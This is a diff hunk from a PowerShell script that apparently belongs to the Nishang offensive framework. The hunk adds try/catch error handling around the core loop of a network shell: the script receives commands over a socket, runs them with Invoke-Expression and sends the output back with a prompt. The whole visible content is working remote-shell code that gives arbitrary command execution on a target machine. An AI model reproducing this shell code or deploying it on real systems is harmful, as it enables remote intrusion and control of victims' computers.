@@ -113,7 +113,17 @@ https://github.com/samratashok/nishang
         {
             $receivebytes = $client.Receive([ref]$endpoint)
             $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
-            $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
+            
+            try
+            {
+                #Execute the command on the target.
+                $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
 
             $sendback = $result +  'PS ' + (Get-Location).Path + '> '
             $x = ($error[0] | Out-String)
